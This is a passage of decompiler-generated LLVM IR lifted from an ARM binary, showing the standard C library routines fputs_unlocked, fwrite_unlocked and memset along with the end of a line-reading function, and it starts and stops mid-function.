  store i1 %v2_14a64, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_14aec, label %dec_label_pc_14ad4.preheader

dec_label_pc_14ad4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_14ad42 = add i32 %arg2, -1
  store i32 %v1_14ad42, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_14ad48 = icmp eq i32 %arg2, 1
  store i1 %v7_14ad48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14ad48, label %dec_label_pc_14adc, label %dec_label_pc_14a80

dec_label_pc_14a80:                               ; preds = %dec_label_pc_14ad4.preheader, %dec_label_pc_14ad4.backedge.dec_label_pc_14a80_crit_edge
  %v0_14aa4 = phi i32 [ %v0_14a80.pre, %dec_label_pc_14ad4.backedge.dec_label_pc_14a80_crit_edge ], [ %arg3, %dec_label_pc_14ad4.preheader ]
  %v1_14a80 = add i32 %v0_14aa4, 16
  %v2_14a80 = inttoptr i32 %v1_14a80 to i32*
  %v3_14a80 = load i32, i32* %v2_14a80, align 4
  store i32 %v3_14a80, i32* %r2.global-to-local, align 4
  %v1_14a84 = add i32 %v0_14aa4, 24
  %v2_14a84 = inttoptr i32 %v1_14a84 to i32*
  %v3_14a84 = load i32, i32* %v2_14a84, align 4
  store i32 %v3_14a84, i32* %r3.global-to-local, align 4
  %v3_14a88 = icmp uge i32 %v3_14a80, %v3_14a84
  store i1 %v3_14a88, i1* %cpsr_c.global-to-local, align 1
  %v9_14a88 = icmp eq i32 %v3_14a80, %v3_14a84
  store i1 %v9_14a88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14a88, label %dec_label_pc_14aa4, label %dec_label_pc_14a90

dec_label_pc_14a90:                               ; preds = %dec_label_pc_14a80
  %v1_14a90 = inttoptr i32 %v3_14a80 to i8*
  %v2_14a90 = load i8, i8* %v1_14a90, align 1
  %v3_14a90 = zext i8 %v2_14a90 to i32
  store i32 %v3_14a90, i32* %r3.global-to-local, align 4
  %v5_14a90 = add i32 %v3_14a80, 1
  store i32 %v5_14a90, i32* %r2.global-to-local, align 4
  %v2_14a94 = load i32, i32* @r5, align 4
  %v3_14a94 = inttoptr i32 %v2_14a94 to i8*
  store i8 %v2_14a90, i8* %v3_14a94, align 1
  %v4_14a94 = load i32, i32* @r5, align 4
  %v5_14a94 = add i32 %v4_14a94, 1
  store i32 %v5_14a94, i32* @r5, align 4
  %v0_14a98 = load i32, i32* %r3.global-to-local, align 4
  %v2_14a98 = icmp ugt i32 %v0_14a98, 9
  store i1 %v2_14a98, i1* %cpsr_c.global-to-local, align 1
  %v7_14a98 = icmp eq i32 %v0_14a98, 10
  store i1 %v7_14a98, i1* %cpsr_z.global-to-local, align 1
  %v0_14a9c = load i32, i32* %r2.global-to-local, align 4
  %v1_14a9c = load i32, i32* @r4, align 4
  %v2_14a9c = add i32 %v1_14a9c, 16
  %v3_14a9c = inttoptr i32 %v2_14a9c to i32*
  store i32 %v0_14a9c, i32* %v3_14a9c, align 4
  br i1 %v7_14a98, label %dec_label_pc_14adc, label %dec_label_pc_14ad4.backedge

dec_label_pc_14aa4:                               ; preds = %dec_label_pc_14a80
  %v1_14aa4 = inttoptr i32 %v0_14aa4 to i16*
  %v3_14aa8 = call i32 @getc_unlocked(i16* %v1_14aa4)
  %v3_14aac = icmp eq i32 %v3_14aa8, -1
  store i1 %v3_14aac, i1* %cpsr_c.global-to-local, align 1
  %v8_14aac = icmp eq i32 %v3_14aa8, -1
  store i1 %v8_14aac, i1* %cpsr_z.global-to-local, align 1
  %v1_14ab0 = urem i32 %v3_14aa8, 256
  store i32 %v1_14ab0, i32* %r3.global-to-local, align 4
  br i1 %v3_14aac, label %dec_label_pc_14ab8, label %dec_label_pc_14ad0

dec_label_pc_14ab8:                               ; preds = %dec_label_pc_14aa4
  %v0_14ab8 = load i32, i32* @r4, align 4
  %v1_14ab8 = inttoptr i32 %v0_14ab8 to i16*
  %v2_14ab8 = load i16, i16* %v1_14ab8, align 2
  %v3_14ab8 = zext i16 %v2_14ab8 to i32
  store i32 %v3_14ab8, i32* %r3.global-to-local, align 4
  %v1_14abc = and i32 %v3_14ab8, 8
  %v2_14abc = icmp eq i32 %v1_14abc, 0
  store i1 %v2_14abc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14abc, label %dec_label_pc_14adc, label %dec_label_pc_14aec

dec_label_pc_14ad0:                               ; preds = %dec_label_pc_14aa4
  %v1_14ac8 = trunc i32 %v3_14aa8 to i8
  %v2_14ac8 = load i32, i32* @r5, align 4
  %v3_14ac8 = inttoptr i32 %v2_14ac8 to i8*
  store i8 %v1_14ac8, i8* %v3_14ac8, align 1
  %v4_14ac8 = load i32, i32* @r5, align 4
  %v5_14ac8 = add i32 %v4_14ac8, 1
  store i32 %v5_14ac8, i32* @r5, align 4
  %v0_14acc = load i32, i32* %r3.global-to-local, align 4
  %v2_14acc = icmp ugt i32 %v0_14acc, 9
  store i1 %v2_14acc, i1* %cpsr_c.global-to-local, align 1
  %v7_14acc = icmp eq i32 %v0_14acc, 10
  store i1 %v7_14acc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14acc, label %dec_label_pc_14adc, label %dec_label_pc_14ad4.backedge

dec_label_pc_14ad4.backedge:                      ; preds = %dec_label_pc_14ad0, %dec_label_pc_14a90
  %v0_14ad4 = load i32, i32* %r6.global-to-local, align 4
  %v1_14ad4 = add i32 %v0_14ad4, -1
  store i32 %v1_14ad4, i32* %r6.global-to-local, align 4
  %v2_14ad4 = icmp ne i32 %v0_14ad4, 0
  store i1 %v2_14ad4, i1* %cpsr_c.global-to-local, align 1
  %v7_14ad4 = icmp eq i32 %v0_14ad4, 1
  store i1 %v7_14ad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14ad4, label %dec_label_pc_14adc, label %dec_label_pc_14ad4.backedge.dec_label_pc_14a80_crit_edge

dec_label_pc_14ad4.backedge.dec_label_pc_14a80_crit_edge: ; preds = %dec_label_pc_14ad4.backedge
  %v0_14a80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14a80

dec_label_pc_14adc:                               ; preds = %dec_label_pc_14ad0, %dec_label_pc_14ad4.backedge, %dec_label_pc_14a90, %dec_label_pc_14ad4.preheader, %dec_label_pc_14ab8
  %v0_14adc = load i32, i32* @r5, align 4
  %v1_14adc = load i32, i32* @r7, align 4
  %v3_14adc = icmp uge i32 %v0_14adc, %v1_14adc
  store i1 %v3_14adc, i1* %cpsr_c.global-to-local, align 1
  %v9_14adc = icmp eq i32 %v0_14adc, %v1_14adc
  store i1 %v9_14adc, i1* %cpsr_z.global-to-local, align 1
  %v2_14ae0 = xor i1 %v9_14adc, true
  %v3_14ae0 = and i1 %v3_14adc, %v2_14ae0
  br i1 %v3_14ae0, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_14adc
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_14ae4 = inttoptr i32 %v0_14adc to i8*
  store i8 0, i8* %v7_14ae4, align 1
  %v0_14ae8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_14ae8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_14adc, %bb
  %v1_14ae8 = phi i1 [ %v1_14ae8.pre, %bb ], [ %v9_14adc, %dec_label_pc_14adc ]
  %v0_14ae8 = phi i1 [ %v0_14ae8.pre, %bb ], [ %v3_14adc, %dec_label_pc_14adc ]
  %v2_14ae8 = xor i1 %v1_14ae8, true
  %v3_14ae8 = and i1 %v0_14ae8, %v2_14ae8
  br i1 %v3_14ae8, label %.dec_label_pc_14af0_crit_edge, label %dec_label_pc_14aec

.dec_label_pc_14af0_crit_edge:                    ; preds = %.thread14
  %v0_14af0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14af0

dec_label_pc_14aec:                               ; preds = %entry, %dec_label_pc_14ab8, %.thread14
  br label %dec_label_pc_14af0

dec_label_pc_14af0:                               ; preds = %.dec_label_pc_14af0_crit_edge, %dec_label_pc_14aec
  %v0_14af0 = phi i32 [ %v0_14af0.pre, %.dec_label_pc_14af0_crit_edge ], [ 0, %dec_label_pc_14aec ]
  store i32 %v6_14a60, i32* @r5, align 4
  ret i32 %v0_14af0

; uselistorder directives
  uselistorder i1 %v9_14adc, { 1, 0, 2 }
  uselistorder i32 %v1_14adc, { 1, 0 }
  uselistorder i32 %v0_14adc, { 0, 2, 1 }
  uselistorder i32 %v0_14ad4, { 2, 0, 1 }
  uselistorder i32 %v0_14acc, { 1, 0 }
  uselistorder i32 %v3_14aa8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_14a98, { 1, 0 }
  uselistorder i32 %v3_14a80, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_14aa4, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_14af0, { 1, 0 }
  uselistorder label %dec_label_pc_14aec, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_14adc, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_14a80, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_14b00 = load i32, i32* @r4, align 4
  store i32 %v3_14b00, i32* %stack_var_-16, align 4
  %v6_14b00 = load i32, i32* @r5, align 4
  %v9_14b00 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_14b0c = call i32 @strlen(i8* %arg1)
  store i32 %v3_14b0c, i32* @r6, align 4
  %v0_14b14 = load i32, i32* @r5, align 4
  %v0_14b18 = load i32, i32* @r4, align 4
  %v5_14b24 = inttoptr i32 %v0_14b14 to i16*
  %v6_14b24 = call i32 @__GI_fwrite_unlocked(i32 %v0_14b18, i32 1, i32 %v3_14b0c, i16* %v5_14b24)
  %v1_14b28 = load i32, i32* @r6, align 4
  %v9_14b28 = icmp eq i32 %v6_14b24, %v1_14b28
  br i1 %v9_14b28, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_14b34 = phi i32 [ %v6_14b24, %entry ], [ -1, %bb ]
  %v2_14b30 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14b30, i32* @r4, align 4
  store i32 %v6_14b00, i32* @r5, align 4
  store i32 %v9_14b00, i32* @r6, align 4
  ret i32 %v1_14b34

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_14b38 = load i32, i32* @r6, align 4
  %v12_14b38 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_14b40 = load i16, i16* %arg4, align 2
  %v1_14b44 = and i16 %v3_14b40, 192
  %v2_14b48 = icmp eq i16 %v1_14b44, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_14b48, label %dec_label_pc_14b74, label %dec_label_pc_14b60

dec_label_pc_14b60:                               ; preds = %entry
  %v4_14b68 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_14b6c = icmp eq i32 %v4_14b68, 0
  br i1 %v2_14b6c, label %dec_label_pc_14b74thread-pre-split, label %dec_label_pc_14bd4

dec_label_pc_14b74thread-pre-split:               ; preds = %dec_label_pc_14b60
  %v0_14b74.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_14b74

dec_label_pc_14b74:                               ; preds = %dec_label_pc_14b74thread-pre-split, %entry
  %v0_14b98 = phi i32 [ %v0_14b74.pr, %dec_label_pc_14b74thread-pre-split ], [ %arg2, %entry ]
  %v2_14b74 = icmp eq i32 %v0_14b98, 0
  br i1 %v2_14b74, label %dec_label_pc_14bd4, label %bb

bb:                                               ; preds = %dec_label_pc_14b74
  %v1_14b78 = load i32, i32* @r6, align 4
  %v3_14b78 = icmp eq i32 %v1_14b78, 0
  br i1 %v3_14b78, label %dec_label_pc_14bd4, label %dec_label_pc_14b80

dec_label_pc_14b80:                               ; preds = %bb
  %v2_14b88 = udiv i32 -1, %v0_14b98
  %tmp9 = icmp ugt i32 %v1_14b78, %v2_14b88
  %v0_14bb4 = load i32, i32* @r5, align 4
  %v1_14bb4 = inttoptr i32 %v0_14bb4 to i16*
  br i1 %tmp9, label %dec_label_pc_14bb4, label %dec_label_pc_14b94

dec_label_pc_14b94:                               ; preds = %dec_label_pc_14b80
  store i32 %v0_14bb4, i32* %r2.global-to-local, align 4
  %v2_14b98 = mul i32 %v1_14b78, %v0_14b98
  %v0_14b9c = load i32, i32* @r7, align 4
  %v5_14ba0 = call i32 @__stdio_fwrite(i32 %v0_14b9c, i32 %v2_14b98, i16* %v1_14bb4)
  %v0_14ba4 = load i32, i32* @r4, align 4
  %v2_14ba8 = udiv i32 %v5_14ba0, %v0_14ba4
  store i32 %v2_14ba8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14bd8

dec_label_pc_14bb4:                               ; preds = %dec_label_pc_14b80
  %v2_14bb4 = load i16, i16* %v1_14bb4, align 2
  %v1_14bb8 = or i16 %v2_14bb4, 8
  store i16 %v1_14bb8, i16* %v1_14bb4, align 2
  %v0_14bc0 = call i32 @__GI___errno_location()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_14bcc = inttoptr i32 %v0_14bc0 to i32*
  store i32 22, i32* %v2_14bcc, align 4
  %v0_14bd8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14bd8

dec_label_pc_14bd4:                               ; preds = %dec_label_pc_14b74, %dec_label_pc_14b60, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14bd8

dec_label_pc_14bd8:                               ; preds = %dec_label_pc_14bb4, %dec_label_pc_14b94, %dec_label_pc_14bd4
  %v0_14bd8 = phi i32 [ %v0_14bd8.pre, %dec_label_pc_14bb4 ], [ %v2_14ba8, %dec_label_pc_14b94 ], [ 0, %dec_label_pc_14bd4 ]
  store i32 %v9_14b38, i32* @r6, align 4
  store i32 %v12_14b38, i32* @r7, align 4
  ret i32 %v0_14bd8

; uselistorder directives
  uselistorder i16* %v1_14bb4, { 0, 2, 1 }
  uselistorder i32 %v1_14b78, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_14bd8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14bd4, { 2, 0, 1 }
}

define i32 @function_14be8(i32 %arg1) local_unnamed_addr {
dec_label_pc_14be8:
  ret i32 %arg1
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_14bf4 = load i32, i32* @r2, align 4
  %v8_14bf4 = icmp eq i32 %v0_14bf4, 8
  store i1 %v8_14bf4, i1* %cpsr_z.global-to-local, align 1
  %v5_14bf8 = icmp slt i32 %v0_14bf4, 8
  br i1 %v5_14bf8, label %dec_label_pc_14c58, label %dec_label_pc_14bfc

dec_label_pc_14bfc:                               ; preds = %entry
  %v4_14bfc = mul i32 %arg2, 256
  %v5_14bfc = or i32 %v4_14bfc, %arg2
  %v4_14c00 = mul i32 %v5_14bfc, 65536
  %v5_14c00 = or i32 %v4_14c00, %v5_14bfc
  store i32 %v5_14c00, i32* %r1.global-to-local, align 4
  %v1_14c0457 = urem i32 %tmp, 4
  %v2_14c0458 = icmp eq i32 %v1_14c0457, 0
  store i1 %v2_14c0458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_14c0458, label %dec_label_pc_14c14, label %bb

bb:                                               ; preds = %dec_label_pc_14bfc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_14bfc ]
  %v3_14c0859 = phi i32 [ %v6_14c08, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_14bfc ]
  %v4_14c08 = inttoptr i32 %v3_14c0859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_14c08, align 1
  %v5_14c08 = load i32, i32* @r3, align 4
  %v6_14c08 = add i32 %v5_14c08, 1
  store i32 %v6_14c08, i32* @r3, align 4
  %v0_14c0c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_14c18.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_14c0c.pr, label %dec_label_pc_14c14, label %.thread

.thread:                                          ; preds = %bb
  %v2_14c0c = add i32 %v0_14c18.pr.pre, -1
  store i32 %v2_14c0c, i32* @r2, align 4
  %v1_14c04 = urem i32 %v6_14c08, 4
  %v2_14c04 = icmp eq i32 %v1_14c04, 0
  store i1 %v2_14c04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c04, label %dec_label_pc_14c14, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_14c08.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_14c08.pre to i8
  br label %bb

dec_label_pc_14c14:                               ; preds = %.thread, %bb, %dec_label_pc_14bfc
  %v0_14c2028 = phi i32 [ %tmp, %dec_label_pc_14bfc ], [ %v6_14c08, %bb ], [ %v6_14c08, %.thread ]
  %v0_14c18.pr = phi i32 [ %v0_14bf4, %dec_label_pc_14bfc ], [ %v0_14c18.pr.pre, %bb ], [ %v2_14c0c, %.thread ]
  %v0_14c14 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14c14, i32* @ip, align 4
  %v8_14c1810 = icmp eq i32 %v0_14c18.pr, 8
  store i1 %v8_14c1810, i1* %cpsr_z.global-to-local, align 1
  %v5_14c1c11 = icmp slt i32 %v0_14c18.pr, 8
  br i1 %v5_14c1c11, label %dec_label_pc_14c58, label %dec_label_pc_14c20.preheader

dec_label_pc_14c20.preheader:                     ; preds = %dec_label_pc_14c14
  %v1_14c2046 = inttoptr i32 %v0_14c2028 to i32*
  store i32 %v0_14c14, i32* %v1_14c2046, align 4
  %v3_14c2047 = add i32 %v0_14c2028, 4
  %v4_14c2048 = inttoptr i32 %v3_14c2047 to i32*
  %v5_14c2049 = load i32, i32* @ip, align 4
  store i32 %v5_14c2049, i32* %v4_14c2048, align 4
  %v6_14c2050 = add i32 %v0_14c2028, 8
  store i32 %v6_14c2050, i32* @r3, align 4
  %v0_14c2451 = load i32, i32* @r2, align 4
  %v1_14c2452 = add i32 %v0_14c2451, -8
  store i32 %v1_14c2452, i32* %r2.global-to-local, align 4
  %v5_14c2c53 = icmp slt i32 %v1_14c2452, 8
  br i1 %v5_14c2c53, label %dec_label_pc_14c20.dec_label_pc_14c58.loopexit_crit_edge, label %dec_label_pc_14c30

dec_label_pc_14c30:                               ; preds = %dec_label_pc_14c20.preheader, %dec_label_pc_14c18.dec_label_pc_14c20_crit_edge
  %v6_14c2055 = phi i32 [ %v6_14c20, %dec_label_pc_14c18.dec_label_pc_14c20_crit_edge ], [ %v6_14c2050, %dec_label_pc_14c20.preheader ]
  %v0_14c2054 = phi i32 [ %v12_14c4c, %dec_label_pc_14c18.dec_label_pc_14c20_crit_edge ], [ %v0_14c2028, %dec_label_pc_14c20.preheader ]
  %v1_14c30 = inttoptr i32 %v6_14c2055 to i32*
  %v2_14c30 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_14c30, i32* %v1_14c30, align 4
  %v3_14c30 = add i32 %v0_14c2054, 12
  %v4_14c30 = inttoptr i32 %v3_14c30 to i32*
  %v5_14c30 = load i32, i32* @ip, align 4
  store i32 %v5_14c30, i32* %v4_14c30, align 4
  %v6_14c30 = add i32 %v0_14c2054, 16
  store i32 %v6_14c30, i32* @r3, align 4
  %v0_14c34 = load i32, i32* %r2.global-to-local, align 4
  %v1_14c34 = add i32 %v0_14c34, -8
  store i32 %v1_14c34, i32* %r2.global-to-local, align 4
  %v5_14c3c = icmp slt i32 %v1_14c34, 8
  br i1 %v5_14c3c, label %dec_label_pc_14c30.dec_label_pc_14c58.loopexit_crit_edge, label %dec_label_pc_14c40

dec_label_pc_14c40:                               ; preds = %dec_label_pc_14c30
  %v1_14c40 = inttoptr i32 %v6_14c30 to i32*
  %v2_14c40 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_14c40, i32* %v1_14c40, align 4
  %v3_14c40 = add i32 %v0_14c2054, 20
  %v4_14c40 = inttoptr i32 %v3_14c40 to i32*
  %v5_14c40 = load i32, i32* @ip, align 4
  store i32 %v5_14c40, i32* %v4_14c40, align 4
  %v6_14c40 = add i32 %v0_14c2054, 24
  store i32 %v6_14c40, i32* @r3, align 4
  %v0_14c44 = load i32, i32* %r2.global-to-local, align 4
  %v1_14c44 = add i32 %v0_14c44, -8
  store i32 %v1_14c44, i32* %r2.global-to-local, align 4
  %v5_14c4c = icmp slt i32 %v1_14c44, 8
  br i1 %v5_14c4c, label %dec_label_pc_14c40.dec_label_pc_14c58.loopexit_crit_edge, label %dec_label_pc_14c18

dec_label_pc_14c18:                               ; preds = %dec_label_pc_14c40
  %v7_14c4c = inttoptr i32 %v6_14c40 to i32*
  %v8_14c4c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_14c4c, i32* %v7_14c4c, align 4
  %v9_14c4c = add i32 %v0_14c2054, 28
  %v10_14c4c = inttoptr i32 %v9_14c4c to i32*
  %v11_14c4c = load i32, i32* @ip, align 4
  store i32 %v11_14c4c, i32* %v10_14c4c, align 4
  %v12_14c4c = add i32 %v0_14c2054, 32
  store i32 %v12_14c4c, i32* @r3, align 4
  %v6_14c50 = load i32, i32* %r2.global-to-local, align 4
  %v7_14c50 = add i32 %v6_14c50, -8
  store i32 %v7_14c50, i32* %r2.global-to-local, align 4
  %v5_14c1c = icmp slt i32 %v7_14c50, 8
  br i1 %v5_14c1c, label %dec_label_pc_14c18.dec_label_pc_14c58.loopexit_crit_edge, label %dec_label_pc_14c18.dec_label_pc_14c20_crit_edge

dec_label_pc_14c18.dec_label_pc_14c20_crit_edge:  ; preds = %dec_label_pc_14c18
  %v2_14c20.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14c20 = inttoptr i32 %v12_14c4c to i32*
  store i32 %v2_14c20.pre, i32* %v1_14c20, align 4
  %v3_14c20 = add i32 %v0_14c2054, 36
  %v4_14c20 = inttoptr i32 %v3_14c20 to i32*
  %v5_14c20 = load i32, i32* @ip, align 4
  store i32 %v5_14c20, i32* %v4_14c20, align 4
  %v6_14c20 = add i32 %v0_14c2054, 40
  store i32 %v6_14c20, i32* @r3, align 4
  %v0_14c24 = load i32, i32* %r2.global-to-local, align 4
  %v1_14c24 = add i32 %v0_14c24, -8
  store i32 %v1_14c24, i32* %r2.global-to-local, align 4
  %v5_14c2c = icmp slt i32 %v1_14c24, 8
  br i1 %v5_14c2c, label %dec_label_pc_14c20.dec_label_pc_14c58.loopexit_crit_edge, label %dec_label_pc_14c30

dec_label_pc_14c18.dec_label_pc_14c58.loopexit_crit_edge: ; preds = %dec_label_pc_14c18
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14c58

dec_label_pc_14c20.dec_label_pc_14c58.loopexit_crit_edge: ; preds = %dec_label_pc_14c18.dec_label_pc_14c20_crit_edge, %dec_label_pc_14c20.preheader
  %v1_14c24.lcssa = phi i32 [ %v1_14c2452, %dec_label_pc_14c20.preheader ], [ %v1_14c24, %dec_label_pc_14c18.dec_label_pc_14c20_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14c58

dec_label_pc_14c30.dec_label_pc_14c58.loopexit_crit_edge: ; preds = %dec_label_pc_14c30
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14c58

dec_label_pc_14c40.dec_label_pc_14c58.loopexit_crit_edge: ; preds = %dec_label_pc_14c40
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14c58

dec_label_pc_14c58:                               ; preds = %dec_label_pc_14c14, %dec_label_pc_14c18.dec_label_pc_14c58.loopexit_crit_edge, %dec_label_pc_14c20.dec_label_pc_14c58.loopexit_crit_edge, %dec_label_pc_14c30.dec_label_pc_14c58.loopexit_crit_edge, %dec_label_pc_14c40.dec_label_pc_14c58.loopexit_crit_edge, %entry
  %v0_14c60 = phi i32 [ %v0_14bf4, %entry ], [ %v1_14c44, %dec_label_pc_14c40.dec_label_pc_14c58.loopexit_crit_edge ], [ %v1_14c34, %dec_label_pc_14c30.dec_label_pc_14c58.loopexit_crit_edge ], [ %v1_14c24.lcssa, %dec_label_pc_14c20.dec_label_pc_14c58.loopexit_crit_edge ], [ %v7_14c50, %dec_label_pc_14c18.dec_label_pc_14c58.loopexit_crit_edge ], [ %v0_14c18.pr, %dec_label_pc_14c14 ]
  %v2_14c58 = icmp eq i32 %v0_14c60, 0
  store i1 %v2_14c58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c58, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_14c58
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_14c58
  %v1_14c60 = sub i32 7, %v0_14c60
  store i32 %v1_14c60, i32* %r2.global-to-local, align 4
  %v3_14c64 = mul i32 %v1_14c60, 4
  %v4_14c64 = add i32 %v3_14c64, ptrtoint (i32* @global_var_14c6c.918 to i32)
  call void @__pseudo_branch(i32 %v4_14c64)
  %v0_14c6c = load i32, i32* %r1.global-to-local, align 4
  %v1_14c6c = trunc i32 %v0_14c6c to i8
  %v2_14c6c = load i32, i32* @r3, align 4
  %v3_14c6c = inttoptr i32 %v2_14c6c to i8*
  store i8 %v1_14c6c, i8* %v3_14c6c, align 1
  %v4_14c6c = load i32, i32* @r3, align 4
  %v5_14c6c = add i32 %v4_14c6c, 1
  store i32 %v5_14c6c, i32* %r3.global-to-local, align 4
  %v0_14c70 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c70 = trunc i32 %v0_14c70 to i8
  %v3_14c70 = inttoptr i32 %v5_14c6c to i8*
  store i8 %v1_14c70, i8* %v3_14c70, align 1
  %v4_14c70 = load i32, i32* %r3.global-to-local, align 4
  %v5_14c70 = add i32 %v4_14c70, 1
  store i32 %v5_14c70, i32* %r3.global-to-local, align 4
  %v0_14c74 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c74 = trunc i32 %v0_14c74 to i8
  %v3_14c74 = inttoptr i32 %v5_14c70 to i8*
  store i8 %v1_14c74, i8* %v3_14c74, align 1
  %v4_14c74 = load i32, i32* %r3.global-to-local, align 4
  %v5_14c74 = add i32 %v4_14c74, 1
  store i32 %v5_14c74, i32* %r3.global-to-local, align 4
  %v0_14c78 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c78 = trunc i32 %v0_14c78 to i8
  %v3_14c78 = inttoptr i32 %v5_14c74 to i8*
  store i8 %v1_14c78, i8* %v3_14c78, align 1
  %v4_14c78 = load i32, i32* %r3.global-to-local, align 4
  %v5_14c78 = add i32 %v4_14c78, 1
  store i32 %v5_14c78, i32* %r3.global-to-local, align 4
  %v0_14c7c = load i32, i32* %r1.global-to-local, align 4
  %v1_14c7c = trunc i32 %v0_14c7c to i8
  %v3_14c7c = inttoptr i32 %v5_14c78 to i8*
  store i8 %v1_14c7c, i8* %v3_14c7c, align 1
  %v4_14c7c = load i32, i32* %r3.global-to-local, align 4
  %v5_14c7c = add i32 %v4_14c7c, 1
  store i32 %v5_14c7c, i32* %r3.global-to-local, align 4
  %v0_14c80 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c80 = trunc i32 %v0_14c80 to i8
  %v3_14c80 = inttoptr i32 %v5_14c7c to i8*
  store i8 %v1_14c80, i8* %v3_14c80, align 1
  %v4_14c80 = load i32, i32* %r3.global-to-local, align 4
  %v5_14c80 = add i32 %v4_14c80, 1
  store i32 %v5_14c80, i32* %r3.global-to-local, align 4
  %v0_14c84 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c84 = trunc i32 %v0_14c84 to i8
  %v3_14c84 = inttoptr i32 %v5_14c80 to i8*
  store i8 %v1_14c84, i8* %v3_14c84, align 1
  %v4_14c84 = load i32, i32* %r3.global-to-local, align 4
  %v5_14c84 = add i32 %v4_14c84, 1
